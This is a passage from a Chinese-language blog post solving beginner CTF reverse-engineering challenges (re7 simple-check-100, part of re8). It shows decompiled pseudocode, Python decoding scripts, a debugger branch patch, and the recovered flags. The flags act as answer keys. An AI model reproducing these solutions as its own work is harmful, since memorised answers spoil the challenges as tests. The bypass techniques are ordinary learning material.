v25);</span><br><span class="line">    v26 = sub_402A00(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"                 |-------------|"</span>, sub_402C50);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v26, v27);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, sub_402C50);</span><br><span class="line">    v28 = sub_402A00(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Congrats You got it!"</span>, sub_402C50);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v28, v30);</span><br><span class="line">  sub_401570(&amp;v40);</span><br><span class="line">  <span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::~basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v40);</span><br><span class="line">  <span class="keyword">if</span> ( v49 &gt;= <span class="number">0x10</span> )</span><br><span class="line">    sub_402630(Memory[<span class="number">0</span>], v49 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0x10</span> )</span><br><span class="line">    sub_402630(v3, v2 + <span class="number">1</span>);</span><br><span class="line">  result = v46;</span><br><span class="line">  <span class="keyword">if</span> ( v46 &gt;= <span class="number">0x10</span> )</span><br><span class="line">    result = sub_402630(v44, v46 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_4020C0:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __thiscall <span class="title">sub_4020C0</span><span class="params">(_DWORD *Dst_p, <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">unsigned</span> <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> flag_p; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">bool</span> v9; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v10; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v11; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v12; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v5 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( Dst_p[<span class="number">4</span>] &lt; a3 )</span><br><span class="line">    v5 = Dst_p[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">if</span> ( Dst_p[<span class="number">5</span>] &gt;= <span class="number">16u</span> )</span><br><span class="line">    Dst_p = (_DWORD *)*Dst_p;</span><br><span class="line">  v6 = a5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; a5 )</span><br><span class="line">    v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    flag_p = a4;                                <span class="comment">// flag_p == "themidathemidathemida"</span></span><br><span class="line">    v9 = v6 &lt; <span class="number">4</span>;</span><br><span class="line">    v8 = v6 - <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">-4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( *Dst_p == *(_DWORD *)flag_p )</span><br><span class="line">      &#123;</span><br><span class="line">        ++Dst_p;</span><br><span class="line">        flag_p += <span class="number">4</span>;</span><br><span class="line">        v9 = v8 &lt; <span class="number">4</span>;</span><br><span class="line">        v8 -= <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v9 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = *(_BYTE *)Dst_p &lt; *(_BYTE *)flag_p;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)Dst_p != *(_BYTE *)flag_p</span><br><span class="line">      || v8 != <span class="number">-3</span></span><br><span class="line">      &amp;&amp; ((v10 = *((_BYTE *)Dst_p + <span class="number">1</span>), v9 = v10 &lt; *(_BYTE *)(flag_p + <span class="number">1</span>), v10 != *(_BYTE *)(flag_p + <span class="number">1</span>))</span><br><span class="line">       || v8 != <span class="number">-2</span></span><br><span class="line">       &amp;&amp; ((v11 = *((_BYTE *)Dst_p + <span class="number">2</span>), v9 = v11 &lt; *(_BYTE *)(flag_p + <span class="number">2</span>), v11 != *(_BYTE *)(flag_p + <span class="number">2</span>))</span><br><span class="line">        || v8 != <span class="number">-1</span> &amp;&amp; (v12 = *((_BYTE *)Dst_p + <span class="number">3</span>), v9 = v12 &lt; *(_BYTE *)(flag_p + <span class="number">3</span>), v12 != *(_BYTE *)(flag_p + <span class="number">3</span>)))) )</span><br><span class="line">    &#123;</span><br><span class="line">      result = -v9 | <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt;= a5 )</span><br><span class="line">    result = v5 != a5;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中最为蛋疼的判断部分：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)Dst_p != *(_BYTE *)flag_p</span><br><span class="line">      || v8 != <span class="number">-3</span></span><br><span class="line"><span class="number">1.</span>      &amp;&amp; (</span><br><span class="line">            (v10 = *((_BYTE *)Dst_p + <span class="number">1</span>), v9 = v10 &lt; *(_BYTE *)(flag_p + <span class="number">1</span>), v10 != *(_BYTE *)(flag_p + <span class="number">1</span>))     </span><br><span class="line">                || v8 != <span class="number">-2</span></span><br><span class="line">                    &amp;&amp; (</span><br><span class="line">                        (v11 = *((_BYTE *)Dst_p + <span class="number">2</span>), v9 = v11 &lt; *(_BYTE *)(flag_p + <span class="number">2</span>), v11 != *(_BYTE *)(flag_p + <span class="number">2</span>))</span><br><span class="line">                            || v8 != <span class="number">-1</span> </span><br><span class="line">                                &amp;&amp; (v12 = *((_BYTE *)Dst_p + <span class="number">3</span>), v9 = v12 &lt; *(_BYTE *)(flag_p + <span class="number">3</span>), v12 != *(_BYTE *)(flag_p + <span class="number">3</span>))</span><br><span class="line">                       )</span><br><span class="line">         ) </span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v8 == <span class="number">-3</span>:</span><br><span class="line">    <span class="number">1.F</span>alse:</span><br><span class="line">        flag_p==Dst_p,</span><br></pre></td></tr></table></figure><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memory_byte = <span class="string">"themidathemidathemida"</span></span><br><span class="line">v50 = <span class="string">"&gt;----++++....&lt;&lt;&lt;&lt;."</span></span><br><span class="line">print(<span class="string">''</span>.join([chr((ord(memory_byte[i]) ^ ord(v50[i]))+<span class="number">22</span>+<span class="number">9</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>)]))</span><br></pre></td></tr></table></figure><p>flag:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idg_cni~bjbfi|gsxb</span><br></pre></td></tr></table></figure><hr><h1>re7 simple-check-100</h1><p>这道题没有做出来不是我的错，是题没出好。</p><p>解压出来三个文件：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1569082454698.png" alt="1569082454698.png"></p><p>main():</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v5; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+1Dh] [rbp-43h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+1Eh] [rbp-42h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+1Fh] [rbp-41h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+21h] [rbp-3Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+22h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+23h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+24h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+25h] [rbp-3Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+26h] [rbp-3Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+27h] [rbp-39h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+29h] [rbp-37h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+2Ah] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+2Bh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+2Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+2Dh] [rbp-33h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+2Eh] [rbp-32h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+2Fh] [rbp-31h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [rsp+31h] [rbp-2Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// [rsp+32h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [rsp+33h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [rsp+34h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [rsp+35h] [rbp-2Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v33; <span class="comment">// [rsp+36h] [rbp-2Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v34; <span class="comment">// [rsp+37h] [rbp-29h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> ***v36; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v37; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = argc;</span><br><span class="line">  v5 = argv;</span><br><span class="line">  v37 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">84</span>;</span><br><span class="line">  v8 = <span class="number">-56</span>;</span><br><span class="line">  v9 = <span class="number">126</span>;</span><br><span class="line">  v10 = <span class="number">-29</span>;</span><br><span class="line">  v11 = <span class="number">100</span>;</span><br><span class="line">  v12 = <span class="number">-57</span>;</span><br><span class="line">  v13 = <span class="number">22</span>;</span><br><span class="line">  v14 = <span class="number">-102</span>;</span><br><span class="line">  v15 = <span class="number">-51</span>;</span><br><span class="line">  v16 = <span class="number">17</span>;</span><br><span class="line">  v17 = <span class="number">101</span>;</span><br><span class="line">  v18 = <span class="number">50</span>;</span><br><span class="line">  v19 = <span class="number">45</span>;</span><br><span class="line">  v20 = <span class="number">-29</span>;</span><br><span class="line">  v21 = <span class="number">-45</span>;</span><br><span class="line">  v22 = <span class="number">67</span>;</span><br><span class="line">  v23 = <span class="number">-110</span>;</span><br><span class="line">  v24 = <span class="number">-87</span>;</span><br><span class="line">  v25 = <span class="number">-99</span>;</span><br><span class="line">  v26 = <span class="number">-46</span>;</span><br><span class="line">  v27 = <span class="number">-26</span>;</span><br><span class="line">  v28 = <span class="number">109</span>;</span><br><span class="line">  v29 = <span class="number">44</span>;</span><br><span class="line">  v30 = <span class="number">-45</span>;</span><br><span class="line">  v31 = <span class="number">-74</span>;</span><br><span class="line">  v32 = <span class="number">-67</span>;</span><br><span class="line">  v33 = <span class="number">-2</span>;</span><br><span class="line">  v34 = <span class="number">106</span>;</span><br><span class="line">  v35 = <span class="number">19L</span>L;</span><br><span class="line">  v3 = alloca(<span class="number">32L</span>L);</span><br><span class="line">  v36 = &amp;v5;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Key: "</span>, argv, <span class="number">3L</span>L, <span class="number">16L</span>L, <span class="number">20L</span>L, <span class="number">0L</span>L, argv);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, v36);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_key((__int64)v36) )</span><br><span class="line">    interesting_function((__int64)&amp;v7);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑太简单，都不想写注释。</p><p>check_key():</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">check_key</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    v2 += *(_DWORD *)(<span class="number">4L</span>L * i + a1);</span><br><span class="line">  <span class="keyword">return</span> v2 == <span class="number">-559038737</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显是个坑人的函数，v2恒为false，所以不会进入到下面的interesting_funstion()</p><p>那么再看看intersting_function()：</p><p>interesting_function():</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">interesting_function</span><span class="params">(__int64 a1)</span><span class="comment">// a1 == 84</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  LODWORD(v1) = a1;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(_DWORD *)(<span class="number">4L</span>L * i + v6) ^ <span class="number">0xDEADBEEF</span>;</span><br><span class="line">    v1 = (<span class="keyword">int</span> *)&amp;v3;</span><br><span class="line">    v7 = (<span class="keyword">int</span> *)&amp;v3;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; --j )</span><br><span class="line">      LODWORD(v1) = <span class="built_in">putchar</span>((<span class="keyword">char</span>)(*((_BYTE *)v7 + j) ^ flag_data[<span class="number">4</span> * i + j]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1是个常量，所以这个函数输出的也是个定值。到这里其实思路很明显了，修改标志位让程序进入这个函数得到flag就可以了，而我也这么做了，但是输出来的却是一串乱码……</p><p>那我就不干了，然后手动把这个函数实现了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">flag_data = [</span><br><span class="line">    <span class="number">0xDC</span>, <span class="number">0x17</span>, <span class="number">0xBF</span>, <span class="number">0x5B</span>, <span class="number">0xD4</span>, <span class="number">0x0A</span>, <span class="number">0xD2</span>, <span class="number">0x1B</span>, <span class="number">0x7D</span>, <span class="number">0xDA</span>,</span><br><span class="line">    <span class="number">0xA7</span>, <span class="number">0x95</span>, <span class="number">0xB5</span>, <span class="number">0x32</span>, <span class="number">0x10</span>, <span class="number">0xF6</span>, <span class="number">0x1C</span>, <span class="number">0x65</span>, <span class="number">0x53</span>, <span class="number">0x53</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xBA</span>, <span class="number">0xEA</span>, <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x22</span>, <span class="number">0x72</span>, <span class="number">0xD3</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">v4 = <span class="number">84</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    v2 = (<span class="number">4</span>*i*v4) ^ <span class="number">0xDEADBEEF</span></span><br><span class="line">    result = int(v2)</span><br><span class="line">    v3 = int(v2)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>]:</span><br><span class="line">        temp = (v3 + j) ^ flag_data[<span class="number">4</span> * i + j]</span><br><span class="line">        flag += chr(temp)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>然鹅：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1569082817612.png" alt="1569082817612.png"></p><p>沃妮马都不知道多大的数了，其实口算一下都知道不可能是字符的。</p><p>到这里我的思路断了，于是把main函数仅有的几行代码翻来覆去的看，要不是这个题实在太简单我甚至要怀疑我是不是学了假的c语言……</p><p>然后去看了别人的writeup，发现别人用exe也做不出来……</p><p>然后把目光放在了一开始给的其他版本文件上。</p><p>打开EDB调试那个64位的ELF文件，下断点改标志位进入分支：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1569083871879.png" alt="1569083871879.png"></p><p>顺利拿到flag：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1569083952906.png" alt="1569083952906.png"></p><p>flag:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_is_you_know_cracking!!!</span><br></pre></td></tr></table></figure><hr><h1>re8 re1-100</h1><p>也很简单，过程都在注释里了</p><p>main()：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span 